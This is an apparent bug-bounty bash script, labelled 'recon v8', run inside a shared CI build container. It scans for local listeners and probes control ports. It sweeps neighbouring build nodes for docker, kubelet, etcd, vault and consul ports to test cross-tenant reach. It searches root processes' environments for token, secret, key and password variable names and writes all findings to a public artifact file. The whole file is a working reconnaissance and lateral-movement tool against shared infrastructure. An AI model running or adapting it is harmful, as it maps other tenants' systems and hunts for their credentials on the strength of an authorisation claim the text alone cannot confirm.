#!/usr/bin/env bash
# H1 build-container recon v8 — the two live threads after v7 (metadata/caps/docker/k8s all HARDENED):
#  (1) LOCAL listeners: what does the root build-agent (uid=0, same netns) LISTEN on that buildbot can reach?
#  (2) FLAT-NETWORK / cross-node reachability: v7 reached a DIFFERENT node's :4317 — can I reach neighbor
#      build nodes' orchestration ports (=> cross-tenant / orchestration-plane)? LIGHT scan (few IPs, few ports).
# RoE-invited (orchestration plane / cross-user secrets). Read-only, metadata-only, low-and-slow, no DoS.
# Researcher: abedalaziz123sayed.
set +e
PUB="public/recon8.txt"; mkdir -p public; : > "$PUB"
p(){ echo "$*" >> "$PUB"; }
p "=====RECON8 START====="
NODE=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
MYIP=$(hostname -I 2>/dev/null | awk '{print $1}')
p "id=$(id) myip=$MYIP node(gw)=$NODE HOST_NODE_IP=$HOST_NODE_IP"

# (1) LOCAL LISTEN sockets (root build-agent control ports in my netns) from /proc/net/tcp + tcp6
python3 - <<'PY' >> "$PUB"
import struct
def dec(a):
    h,pt=a.split(':'); b=struct.pack('<I',int(h,16))
    return f'{b[0]}.{b[1]}.{b[2]}.{b[3]}',int(pt,16)
print("## LOCAL LISTEN sockets (state=0A) — who listens in my netns:")
seen=set()
for fn in ('/proc/net/tcp','/proc/net/tcp6'):
    try:
        for ln in open(fn).read().splitlines()[1:]:
            f=ln.split()
            if f[3]!='0A': continue
            try:
                if fn.endswith('6'):
                    ip='[v6]'; port=int(f[1].split(':')[1],16)
                else:
                    ip,port=dec(f[1])
            except: continue
            uid=f[7]
            key=(ip,port)
            if key in seen: continue
            seen.add(key)
            print(f"  LISTEN {ip}:{port} uid={uid}")
    except Exception as e: print("  err",fn,e)
PY

# probe each non-loopback LISTEN port locally as buildbot (can we talk to the build-agent's control port?)
p "## probe local listeners (http banner, first 120b):"
for PORT in 80 443 2375 6443 8080 8125 9090 9100 4317 50051 8000 3000 5000 7000 9000 9200; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -m2 "http://127.0.0.1:$PORT/" 2>/dev/null)
  [ "$code" != "000" ] && p "  127.0.0.1:$PORT http=$code"
done

# (2) cross-node reachability — neighbor build-node gateways (172.16.X.1) on orchestration ports. LIGHT.
python3 - <<'PY' >> "$PUB"
import socket
# a handful of neighbor /24 gateways + the known other node from v6
nodes=["172.16.0.1","172.16.1.1","172.16.4.1","172.16.5.1","172.16.6.1","172.16.7.1","172.16.8.1"]
ports={22:"ssh",2375:"docker",2376:"docker-tls",6443:"k8s",10250:"kubelet",2379:"etcd",
       8500:"consul",4646:"nomad",8200:"vault",9092:"kafka",4317:"otlp",50051:"grpc",8080:"http-alt"}
print("## cross-node reachability (neighbor build-node gateways, single-connect):")
for nd in nodes:
    open_p=[]
    for pt,nm in ports.items():
        s=socket.socket(); s.settimeout(1)
        try:
            s.connect((nd,pt)); open_p.append(f"{pt}({nm})"); s.close()
        except Exception: pass
    if open_p: print(f"  {nd}: OPEN {', '.join(open_p)}")
print("  (only nodes with OPEN ports listed)")
PY

# (3) OTLP gateway deeper — is my node's :4317 a collector w/ a query/debug side? (gRPC reflection is complex; try http paths)
p "## OTLP :4317 on my node ($NODE) http paths:"
for pth in / /v1/traces /v1/metrics /debug/pprof/ /metrics; do
  p "  $pth -> $(curl -s -o /dev/null -w '%{http_code}' -m2 http://$NODE:4317$pth 2>/dev/null)"
done

# (4) build-agent process & its open files (secrets?) — /proc scan for root procs readable by buildbot
p "## root procs visible + any world-readable cmdline/environ:"
for pid in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$' | head -40); do
  owner=$(stat -c '%u' /proc/$pid 2>/dev/null)
  if [ "$owner" = "0" ]; then
    cmd=$(tr '\0' ' ' </proc/$pid/cmdline 2>/dev/null | head -c100)
    envr=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|KEY|CRED|PASS' | cut -d= -f1 | tr '\n' ',' | head -c120)
    [ -n "$cmd" ] && p "  pid=$pid root cmd=[$cmd] readable_secret_env_keys=[$envr]"
  fi
done

p "=====RECON8 END====="
cat "$PUB"
